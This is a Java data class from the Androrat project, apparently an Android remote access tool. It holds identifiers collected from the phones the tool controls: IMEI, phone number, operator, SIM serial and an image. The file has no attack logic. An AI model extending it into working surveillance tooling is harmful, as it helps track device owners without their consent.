/*
  Part of the Androrat project - https://github.com/RobinDavid/androrat

  Copyright (c) 2012 Robin David

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation, version 3.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General
  Public License along with this library; if not, write to the
  Free Software Foundation, Inc., 59 Temple Place, Suite 330,
  Boston, MA  02111-1307  USA
*/
package gui;

import javax.swing.ImageIcon;

/*
public class User {
    
    private String imei;
    private String countryCode;
    private String telNumber;
    private String operator;
    private String simCountryCode;
    private String simOperator;
    private String simSerial;
    
    public User(String i, String cc, String tn, String op, String simcc, String simop, String simserial) {
        imei = i;
        countryCode = cc;
        telNumber = tn;
        operator = op;
        simCountryCode = simcc;
        simOperator = simop;
        simSerial = simserial;
    }
*/

public class User {
    
    private String imei;
    private String countryCode;
    private String telNumber;
    private String operator;
    private String simCountryCode;
    private String simOperator;
    private String simSerial;
    private String image;
    
    public User(String img, String i, String cc, String tn, String op, String simcc, String simop, String simserial) {
    	image = img ;
        imei = i;
        countryCode = cc;
        telNumber = tn;
        operator = op;
        simCountryCode = simcc;
        simOperator = simop;
        simSerial = simserial;
    }
    
	public String getImage()
	{
		return image;
	}

	public void setImage(String image)
	{
		this.image = image;
	}

	public void setCountryCode(String countryCode) {
        this.countryCode = countryCode;
    }

    public void setImei(String imei) {
        this.imei = imei;
    }

    public void setOperator(String operator) {
        this.operator = operator;
    }

    public void setSimCountryCode(String simCountryCode) {
        this.simCountryCode = simCountryCode;
    }

    public void setSimOperator(String simOperator) {
        this.simOperator = simOperator;
    }

    public void setSimSerial(String simSerial) {
        this.simSerial = simSerial;
    }

    public void setTelNumber(String telNumber) {
        this.telNumber = telNumber;
    }

    public String getCountryCode() {
        return countryCode;
    }

    public String getImei() {
        return imei;
    }

    public String getOperator() {
        return operator;
    }

    public String getSimCountryCode() {
        return simCountryCode;
    }

    public String getSimOperator() {
        return simOperator;
    }

    public String getSimSerial() {
        return simSerial;
    }

    public String getTelNumber() {
        return telNumber;
    }
    
}
